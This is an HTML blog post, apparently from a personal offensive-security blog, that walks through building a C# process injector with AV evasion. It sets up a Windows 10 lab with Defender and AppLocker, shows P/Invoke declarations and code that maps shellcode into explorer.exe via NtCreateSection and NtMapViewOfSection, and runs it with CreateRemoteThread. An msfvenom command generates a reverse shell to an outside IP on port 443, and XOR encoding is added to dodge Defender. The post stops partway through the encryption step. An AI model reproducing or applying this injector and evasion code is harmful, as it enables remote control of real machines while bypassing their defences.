@@ -1,0 +1,574 @@
+<!doctype html><html lang="en-us">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="generator" content="Qubt theme for Hugo" />
+
+
+
+<title>GionaBolzer - Blog</title>
+<meta name="title" content="GionaBolzer - Blog" />
+
+
+
+  <meta name="author" content="GionaBolzer" />
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<link type="text/css" rel="stylesheet" href="/css/main.bundle.min.a79bb2d99623218b17a5d63695f592ec61ceaedd0ddff91f71272ce63808184b.css" integrity="sha256-p5uy2ZYjIYsXpdY2lfWS7GHOrt0N3/kfcScs5jgIGEs=" />
+
+
+
+
+
+
+
+
+
+<script defer src="/js/main.bundle.min.5a00293bacd8510f50add105212cea76d541a955f6693035ef3128b638a21619.js" integrity="sha256-WgApO6zYUQ9QrdEFISzqdtVBqVX2aTA17zEotjiiFhk="></script>
+
+
+
+
+
+
+<meta property="og:url" content="http://localhost:1313/blog/post1/">
+  <meta property="og:site_name" content="GionaBolzer - Blog">
+  <meta property="og:title" content="Process Injection with Defender e AppLocker bypass">
+  <meta property="og:description" content="The goal is to develop a custom process injection payload utilizing low-level Win32 API calls, while evading detection by Microsoft Defender and bypassing AppLocker restrictions.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="blog">
+    <meta property="article:published_time" content="2024-12-08T00:00:00+00:00">
+    <meta property="article:modified_time" content="2024-12-08T00:00:00+00:00">
+    <meta property="og:image" content="http://localhost:1313/author1.jpg">
+
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="http://localhost:1313/author1.jpg">
+  <meta name="twitter:title" content="Process Injection with Defender e AppLocker bypass">
+  <meta name="twitter:description" content="The goal is to develop a custom process injection payload utilizing low-level Win32 API calls, while evading detection by Microsoft Defender and bypassing AppLocker restrictions.">
+
+
+<script>
+  
+  if (localStorage.getItem("color-theme") === "dark" || (!("color-theme" in localStorage) && window.matchMedia("(prefers-color-scheme: dark)").matches)) {
+    document.documentElement.classList.add("dark");
+  } else {
+    document.documentElement.classList.remove("dark");
+  }
+</script>
+
+  </head>
+  <body class="flex h-screen flex-col justify-between bg-gray-200 dark:bg-gray-700">
+    <div>
+      <header class="sticky top-0 z-10 bg-gray-200 dark:bg-gray-700">
+        
+
+
+
+<section class="mx-auto flex max-w-screen-xl items-center justify-start p-4">
+  
+  <div class="flex flex-row space-x-8">
+    <nav class="hidden space-x-8 text-xl md:block" aria-label="main">
+      
+        <a href="/" class="px-3 py-2 text-gray-700 hover:text-indigo-500 dark:text-slate-200 md:p-0">
+          Home
+        </a>
+      
+        <a href="/blog/" class="px-3 py-2 text-gray-700 hover:text-indigo-500 dark:text-slate-200 md:p-0">
+          Blog
+        </a>
+      
+        <a href="/about/" class="px-3 py-2 text-gray-700 hover:text-indigo-500 dark:text-slate-200 md:p-0">
+          About
+        </a>
+      
+    </nav>
+    <button id="theme-toggle" type="button" class="rounded-lg text-sm text-slate-700 hover:text-indigo-500 dark:text-slate-400" aria-label="theme-switcher">
+      <svg id="theme-toggle-dark-icon" class="hidden h-6 w-6" fill="currentColor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg">
+        <path d="M17.293 13.293A8 8 0 016.707 2.707a8.001 8.001 0 1010.586 10.586z"></path>
+      </svg>
+      <svg id="theme-toggle-light-icon" class="hidden h-6 w-6" fill="currentColor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg">
+        <path
+          d="M10 2a1 1 0 011 1v1a1 1 0 11-2 0V3a1 1 0 011-1zm4 8a4 4 0 11-8 0 4 4 0 018 0zm-.464 4.95l.707.707a1 1 0 001.414-1.414l-.707-.707a1 1 0 00-1.414 1.414zm2.12-10.607a1 1 0 010 1.414l-.706.707a1 1 0 11-1.414-1.414l.707-.707a1 1 0 011.414 0zM17 11a1 1 0 100-2h-1a1 1 0 100 2h1zm-7 4a1 1 0 011 1v1a1 1 0 11-2 0v-1a1 1 0 011-1zM5.05 6.464A1 1 0 106.465 5.05l-.708-.707a1 1 0 00-1.414 1.414l.707.707zm1.414 8.486l-.707.707a1 1 0 01-1.414-1.414l.707-.707a1 1 0 011.414 1.414zM4 11a1 1 0 100-2H3a1 1 0 000 2h1z"
+          fill-rule="evenodd"
+          clip-rule="evenodd"></path>
+      </svg>
+    </button>
+    <button id="hamburger-button" class="relative h-8 w-8 cursor-pointer text-3xl md:hidden" aria-label="hamburger-button">
+      <div
+        class="absolute top-4 -mt-0.5 h-[3px] w-8 rounded bg-slate-700 transition-all duration-500 before:absolute before:h-[3px] before:w-8 before:-translate-x-4 before:-translate-y-2.5 before:rounded before:bg-slate-700 before:transition-all before:duration-500 before:content-[''] after:absolute after:h-[3px] after:w-8 after:-translate-x-4 after:translate-y-2.5 after:rounded after:bg-slate-700 after:transition-all after:duration-500 after:content-[''] dark:bg-slate-400 before:dark:bg-slate-400 after:dark:bg-slate-400"></div>
+    </button>
+  </div>
+</section>
+<section id="mobile-menu" class="absolute hidden w-full origin-top animate-open-menu flex-col justify-center bg-neutral-100 text-4xl dark:bg-neutral-800">
+  <nav class="flex min-h-screen flex-col items-center py-8" aria-label="mobile">
+    
+      <a href="/" class="px-3 py-2 text-center text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">
+        Home
+      </a>
+    
+      <a href="/blog/" class="px-3 py-2 text-center text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">
+        Blog
+      </a>
+    
+      <a href="/about/" class="px-3 py-2 text-center text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">
+        About
+      </a>
+    
+  </nav>
+</section>
+      </header>
+      <main>
+        
+  
+  
+  
+  
+  
+
+
+  <div class="justify-left mx-auto mt-8 flex max-w-screen-md px-4">
+    <article>
+      <h1 class="text-4xl font-extrabold text-slate-700 dark:text-slate-200">
+        Process Injection with Defender e AppLocker bypass
+      </h1>
+      <h2 class="mt-4 text-2xl text-slate-500 dark:text-slate-400">
+        
+      </h2>
+      <div class="mb-4 mt-2 text-sm text-slate-500 dark:text-slate-400">
+        Dec 8, 2024 - 8 minute read
+      </div>
+
+      
+        
+        <div class="flex flex-col">
+          <img class="mt-4 h-full w-full object-cover" src="/post1/photo1_hu1431373527561183953.webp" alt="feature image" height="431" width="736" />
+          
+        </div>
+      
+
+      
+
+
+      <span class="prose prose-slate break-words text-lg text-slate-700 dark:prose-invert prose-pre:max-w-[90vw] dark:text-slate-200 md:prose-pre:max-w-screen-md">
+        <h2 id="objective">Objective</h2>
+<p>The objective is to design a process injection payload that utilizes low-level Win32 API calls to bypass Microsoft Defender&rsquo;s mitigation mechanisms and AppLocker restrictions. Specifically, this payload leverages the NtCreateSection and NtMapViewSection functions to inject shellcode into an unmanaged section of memory within the current process, and then maps this shellcode into the virtual address space of a target process, such as explorer.exe.</p>
+<h2 id="the-setup">The setup</h2>
+<p>The target machine will be a Windows 10 Enterprise fully updated, at the time I am writing, <strong>22H2</strong> version with these hotfixes:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>systeminfo
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Hotfix(s):                 8 Hotfix(s) Installed.
+</span></span><span style="display:flex;"><span>                           [01]: KB5048161
+</span></span><span style="display:flex;"><span>                           [02]: KB5045936
+</span></span><span style="display:flex;"><span>                           [03]: KB5011048
+</span></span><span style="display:flex;"><span>                           [04]: KB5015684
+</span></span><span style="display:flex;"><span>                           [05]: KB5046613
+</span></span><span style="display:flex;"><span>                           [06]: KB5014032
+</span></span><span style="display:flex;"><span>                           [07]: KB5016705
+</span></span><span style="display:flex;"><span>                           [08]: KB5046823
+</span></span></code></pre></div><p>This machine has a local, non-admin account, named Student that will simulate our target user.</p>
+<p>On top of that, the machine has Windows Defender fully turned on</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+
+
+<div class="flex flex-col">
+  <div class="grid-cols-1 grid gap-1">
+    
+      
+      <img src="/blog/post1/defender/defender_hu10675193686687947470.webp" alt="image" loading="lazy" />
+    
+  </div>
+  
+    <span class="-mt-6 mb-4 text-center text-sm text-slate-700 dark:text-slate-200">
+      MD settings
+    </span>
+  
+</div>
+
+<p>And AppLocker with default rules</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+
+
+<div class="flex flex-col">
+  <div class="grid-cols-1 grid gap-1">
+    
+      
+      <img src="/blog/post1/applocker/applocker_hu3791382974479120922.webp" alt="image" loading="lazy" />
+    
+  </div>
+  
+    <span class="-mt-6 mb-4 text-center text-sm text-slate-700 dark:text-slate-200">
+      AppLocker settings
+    </span>
+  
+</div>
+
+<p>That prevent the execution of scripts and binaries outside default locations of non-admin accounts</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\Users\student&gt; $ExecutionContext.SessionState.LanguageMode
+</span></span><span style="display:flex;"><span>ConstrainedLanguage
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PS C:\Users\student&gt; copy C:\Windows\System32\calc.exe C:\Users\student\Desktop\;
+</span></span><span style="display:flex;"><span>C:\Users\student\Desktop\calc.exe
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Program <span style="color:#e6db74">&#39;calc.exe&#39;</span> failed to run This program is blocked by group policy. 
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">For</span> more information, contact your system administrator
+</span></span></code></pre></div><h1 id="the-shellcode-injector">The shellcode injector</h1>
+<p>I want to create a C# payload that uses the following Win32 APIs to inject the shellcode:</p>
+<ul>
+<li><strong><a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-ntcreatesection">NtCreateSection</a></strong></li>
+<li><strong><a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwmapviewofsection">NtCreateSection</a></strong> to map the section in the target process</li>
+</ul>
+<p>We also need to get the handles of the process with:</p>
+<ul>
+<li><strong><a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess">OpenProcess</a></strong> for the target process</li>
+<li><strong><a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getcurrentprocess">GetCurrentProcess</a></strong> for our process</li>
+</ul>
+<p>and invoke the shell code in the remote process with:</p>
+<ul>
+<li><strong><a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread">CreateRemoteThread</a></strong></li>
+</ul>
+<p>We can use <a href="https://www.pinvoke.net/">P/invoke</a> to call these unmanaged apis in our managed code:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-csharp" data-lang="csharp"><span style="display:flex;"><span><span style="color:#a6e22e">[DllImport(&#34;kernel32.dll&#34;, SetLastError = true)]</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">extern</span> IntPtr GetCurrentProcess();
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">[DllImport(&#34;kernel32.dll&#34;, SetLastError = true, ExactSpelling = true)]</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">extern</span> IntPtr OpenProcess(
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint</span> processAccess, 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">bool</span> bInheritHandle, 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> processId);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">[DllImport(&#34;ntdll.dll&#34;, SetLastError = true, ExactSpelling = true)]</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">extern</span> UInt32 NtCreateSection(
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">ref</span> IntPtr SectionHandle,
+</span></span><span style="display:flex;"><span>    UInt32 DesiredAccess,
+</span></span><span style="display:flex;"><span>    IntPtr ObjectAttributes,
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">ref</span> UInt32 MaximumSize,
+</span></span><span style="display:flex;"><span>    UInt32 SectionPageProtection,
+</span></span><span style="display:flex;"><span>    UInt32 AllocationAttributes,
+</span></span><span style="display:flex;"><span>    IntPtr FileHandle);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">[DllImport(&#34;ntdll.dll&#34;, SetLastError = true)]</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">extern</span> <span style="color:#66d9ef">uint</span> NtMapViewOfSection(
+</span></span><span style="display:flex;"><span>    IntPtr SectionHandle,
+</span></span><span style="display:flex;"><span>    IntPtr ProcessHandle,
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">ref</span> IntPtr BaseAddress,
+</span></span><span style="display:flex;"><span>    UIntPtr ZeroBits,
+</span></span><span style="display:flex;"><span>    UIntPtr CommitSize,
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">out</span> <span style="color:#66d9ef">ulong</span> SectionOffset,
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">out</span> <span style="color:#66d9ef">uint</span> ViewSize,
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint</span> InheritDisposition,
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint</span> AllocationType,
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint</span> Win32Protect);
+</span></span></code></pre></div><p>We also need to import some constant values required for the APIs. The documentation can be found on the P/Invoke website:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-csharp" data-lang="csharp"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">const</span> UInt32 STANDARD_RIGHTS_REQUIRED = <span style="color:#ae81ff">0x000F0000</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">const</span> UInt32 SECTION_QUERY = <span style="color:#ae81ff">0x0001</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">const</span> UInt32 SECTION_MAP_WRITE = <span style="color:#ae81ff">0x0002</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">const</span> UInt32 SECTION_MAP_READ = <span style="color:#ae81ff">0x0004</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">const</span> UInt32 SECTION_MAP_EXECUTE = <span style="color:#ae81ff">0x0008</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">const</span> UInt32 SECTION_EXTEND_SIZE = <span style="color:#ae81ff">0x0010</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">const</span> UInt32 SECTION_ALL_ACCESS = STANDARD_RIGHTS_REQUIRED | SECTION_QUERY | SECTION_MAP_WRITE | SECTION_MAP_READ | SECTION_MAP_EXECUTE | SECTION_EXTEND_SIZE;
+</span></span></code></pre></div><p>Now that we have all the functions, we can start to write the injector itself. The first thing is to get the handles of the target process and our own one:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-csharp" data-lang="csharp"><span style="display:flex;"><span><span style="color:#75715e">// get process by name</span>
+</span></span><span style="display:flex;"><span>Process[] localByName = Process.GetProcessesByName(<span style="color:#e6db74">&#34;explorer&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> Id = localByName[<span style="color:#ae81ff">0</span>].Id;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// handle of explorer id</span>
+</span></span><span style="display:flex;"><span>IntPtr hProcess = OpenProcess(<span style="color:#ae81ff">0x001F0FFF</span>, <span style="color:#66d9ef">false</span>, Id)
+</span></span></code></pre></div><p>Where the value 0x001F0FFF is PROCESS_ALL_ACCESS right, the second argument is not relevant in our use, so we set it to false.</p>
+<h2 id="section-map">Section map</h2>
+<p>Before creating the section, because we need to know the size of the shellcode, we create one and add it to the code. I choose a simple stageless one with some iterations and a simple encoder:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msfvenom -p windows/x64/shell_reverse_tcp LHOST<span style="color:#f92672">=</span>192.168.191.226 <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">443</span> -e x64/xor_dynamic -i <span style="color:#ae81ff">3</span> -f csharp
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>byte<span style="color:#f92672">[]</span> buf <span style="color:#f92672">=</span> new byte<span style="color:#f92672">[</span>610<span style="color:#f92672">]</span> <span style="color:#f92672">{</span> 0xbb,0x3b,0xe5,0x6f,0x90,0xd9,  
+</span></span><span style="display:flex;"><span>0xcc,0xd9,0x74,0x24,0xf4,0x5e,0x33,0xc9,0xb1,0xba,0x31,0x5e,
+</span></span><span style="display:flex;"><span>0x12,0x03,0x5e,0x12,0x83,0xd5,0x19,0x8d,0x65,0x96,0x65,0x4e,
+</span></span><span style="display:flex;"><span>0x33,0xfd,0xb3,0xa5,0xe2,0x89,0x67,0xce,0x4e,0x42,0xa1,0x9f,
+</span></span><span style="display:flex;"><span>0xc2,0x95,0x4a,0xf3,0x27,0xae,0xbf,0x70,0xe4,0xd3,0x3e,0x36,
+</span></span><span style="display:flex;"><span>0x25,0x9c,0xf8,0x0e,0x45,0x83,0xdf,0x16,0x3c,0xda,0x0e,...<span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>Now that we have to create the section in our process and map it to the target one. We start to create the section:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-csharp" data-lang="csharp"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">byte</span>[] buf = <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span>[<span style="color:#ae81ff">610</span>] { <span style="color:#ae81ff">0xbb</span>,<span style="color:#ae81ff">0x3b</span>,<span style="color:#ae81ff">0xe5</span>,<span style="color:#ae81ff">0x6f</span>,<span style="color:#ae81ff">0x90</span>,<span style="color:#ae81ff">0xd9</span>,  
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0xcc</span>,<span style="color:#ae81ff">0xd9</span>,<span style="color:#ae81ff">0x74</span>,<span style="color:#ae81ff">0x24</span>,<span style="color:#ae81ff">0xf4</span>,<span style="color:#ae81ff">0x5e</span>,<span style="color:#ae81ff">0x33</span>,<span style="color:#ae81ff">0xc9</span>,<span style="color:#ae81ff">0xb1</span>,<span style="color:#ae81ff">0xba</span>,<span style="color:#ae81ff">0x31</span>,<span style="color:#ae81ff">0x5e</span>,
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x12</span>,<span style="color:#ae81ff">0x03</span>,<span style="color:#ae81ff">0x5e</span>,<span style="color:#ae81ff">0x12</span>,<span style="color:#ae81ff">0x83</span>,<span style="color:#ae81ff">0xd5</span>,<span style="color:#ae81ff">0x19</span>,<span style="color:#ae81ff">0x8d</span>,<span style="color:#ae81ff">0x65</span>,<span style="color:#ae81ff">0x96</span>,<span style="color:#ae81ff">0x65</span>,..}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//size of shell code for the section</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">uint</span> maxSize = (<span style="color:#66d9ef">uint</span>)buf.Length;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// well point to memory address to the section</span>
+</span></span><span style="display:flex;"><span>IntPtr handleSection = IntPtr.Zero;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">uint</span> PAGE_EXECUTE_READWRITE = <span style="color:#ae81ff">0x40</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">uint</span> SEC_COMMIT = <span style="color:#ae81ff">0x8000000</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>NtCreateSection(
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">ref</span> handleSection,
+</span></span><span style="display:flex;"><span>    SECTION_ALL_ACCESS,
+</span></span><span style="display:flex;"><span>    IntPtr.Zero,
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">ref</span> maxSize,
+</span></span><span style="display:flex;"><span>    PAGE_EXECUTE_READWRITE,
+</span></span><span style="display:flex;"><span>    SEC_COMMIT,
+</span></span><span style="display:flex;"><span>    IntPtr.Zero);
+</span></span></code></pre></div><p>The API will write the address of the section in the first argument, with the second we get full access to the section. The fourth is the size of the section that is equal to our shellcode. The fifth and sixth set the page to full access. The third and last are not relevant in our use.</p>
+<h2 id="mapview">MapView</h2>
+<p>Now that the section is created, we have to map it twice, once in our process and once in the target one. We start with our own:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-csharp" data-lang="csharp"><span style="display:flex;"><span>IntPtr address_memory_own_process = IntPtr.Zero;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">uint</span> viewsize = <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">ulong</span> sectionOffset = <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">uint</span> allocation = <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">uint</span> status;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// map section into our own process</span>
+</span></span><span style="display:flex;"><span>status = NtMapViewOfSection(
+</span></span><span style="display:flex;"><span>        handleSection,
+</span></span><span style="display:flex;"><span>        GetCurrentProcess(),
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">ref</span> address_memory_own_process,
+</span></span><span style="display:flex;"><span>        UIntPtr.Zero,
+</span></span><span style="display:flex;"><span>        UIntPtr.Zero,
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">out</span> sectionOffset,
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">out</span> viewsize,
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">2</span>,
+</span></span><span style="display:flex;"><span>        allocation,
+</span></span><span style="display:flex;"><span>        PAGE_EXECUTE_READWRITE
+</span></span><span style="display:flex;"><span>    );
+</span></span></code></pre></div><p>The relevant part is the use of the handleSection created before. The API will write the memory address of the view in the address_memory_own_process variable, and we set the page with PAGE_EXECUTE_READWRITE to have full access.</p>
+<p>We do the same thing with the target process:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-csharp" data-lang="csharp"><span style="display:flex;"><span>IntPtr address_memory_explorer = IntPtr.Zero;
+</span></span><span style="display:flex;"><span>status = NtMapViewOfSection(
+</span></span><span style="display:flex;"><span>        handleSection,
+</span></span><span style="display:flex;"><span>        hProcess,
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">ref</span> address_memory_explorer,
+</span></span><span style="display:flex;"><span>        UIntPtr.Zero,
+</span></span><span style="display:flex;"><span>        UIntPtr.Zero,
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">out</span> sectionOffset,
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">out</span> viewsize,
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">2</span>,
+</span></span><span style="display:flex;"><span>        allocation,
+</span></span><span style="display:flex;"><span>        PAGE_EXECUTE_READWRITE
+</span></span><span style="display:flex;"><span>    );
+</span></span></code></pre></div><p>Now we have to simply copy the shellcode into our view, and because the section is mapped, the remote process will see it:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-csharp" data-lang="csharp"><span style="display:flex;"><span>Marshal.Copy(buf, <span style="color:#ae81ff">0</span>, address_memory_own_process, buf.Length);
+</span></span></code></pre></div><p>Now we can start the thread using the address memory in the remote process:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-csharp" data-lang="csharp"><span style="display:flex;"><span>CreateRemoteThread(hProcess, IntPtr.Zero, <span style="color:#ae81ff">0</span>, address_memory_explorer, IntPtr.Zero, <span style="color:#ae81ff">0</span>, IntPtr.Zero)
+</span></span></code></pre></div><p>And the process injection is complete.</p>
+<h1 id="bypasses">Bypasses</h1>
+<p>Because we also have Defender in place, we have to craft our shellcode in an encrypted and obfuscated way to avoid static analysis. We also have to implement some AV heuristic bypasses to be fully secure.</p>
+<h2 id="the-encrypted-shell-code">The encrypted shell code</h2>
+<p>I chose to do it with a XOR key and a loop over all bytes.</p>
+<p>Below the implementation in c#:</p>
+<p>We declare the key and the unencrypted shellcode.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-csharp" data-lang="csharp"><span style="display:flex;"><span><span style="color:#75715e">// the key</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">byte</span> key = <span style="color:#ae81ff">0x2a</span>;
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// the shell code</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">byte</span>[] buf = <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span>[<span style="color:#ae81ff">610</span>] { <span style="color:#ae81ff">0xbb</span>,<span style="color:#ae81ff">0x3b</span>,<span style="color:#ae81ff">0xe5</span>,<span style="color:#ae81ff">0x6f</span>,<span style="color:#ae81ff">0x90</span>,<span style="color:#ae81ff">0xd9</span>,  
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0xcc</span>,<span style="color:#ae81ff">0xd9</span>,<span style="color:#ae81ff">0x74</span>,<span style="color:#ae81ff">0x24</span>,<span style="color:#ae81ff">0xf4</span>,<span style="color:#ae81ff">0x5e</span>,<span style="color:#ae81ff">0x33</span>,<span style="color:#ae81ff">0xc9</span>,<span style="color:#ae81ff">0xb1</span>,<span style="color:#ae81ff">0xba</span>,<span style="color:#ae81ff">0x31</span>,<span style="color:#ae81ff">0x5e</span>,
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x12</span>,<span style="color:#ae81ff">0x03</span>,<span style="color:#ae81ff">0x5e</span>,<span style="color:#ae81ff">0x12</span>,<span style="color:#ae81ff">0x83</span>,<span style="color:#ae81ff">0xd5</span>,<span style="color:#ae81ff">0x19</span>,<span style="color:#ae81ff">0x8d</span>,<span style="color:#ae81ff">0x65</span>,<span style="color:#ae81ff">0x96</span>,<span style="color:#ae81ff">0x65</span>,<span style="color:#ae81ff">0x4e</span>,
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x33</span>,<span style="color:#ae81ff">0xfd</span>,<span style="color:#ae81ff">0xb3</span>,<span style="color:#ae81ff">0xa5</span>,<span style="color:#ae81ff">0xe2</span>,<span style="color:#ae81ff">0x89</span>,<span style="color:#ae81ff">0x67</span>,<span style="color:#ae81ff">0xce</span>,<span style="color:#ae81ff">0x4e</span>,<span style="color:#ae81ff">0x42</span>,<span style="color:#ae81ff">0xa1</span>,...};
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">byte</span>[] encoded = <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span>[buf.Length];
+</span></span></code></pre></div><p>Now we simply loop over it</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-csharp" data-lang="csharp"><span style="display:flex;"><span><span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i = <span style="color:#ae81ff">0</span>; i &lt; buf.Length; i++)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    encoded[i] = (<span style="color:#66d9ef">byte</span>)(buf[i] ^ key);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>and get the new shellcode encrypted</p>
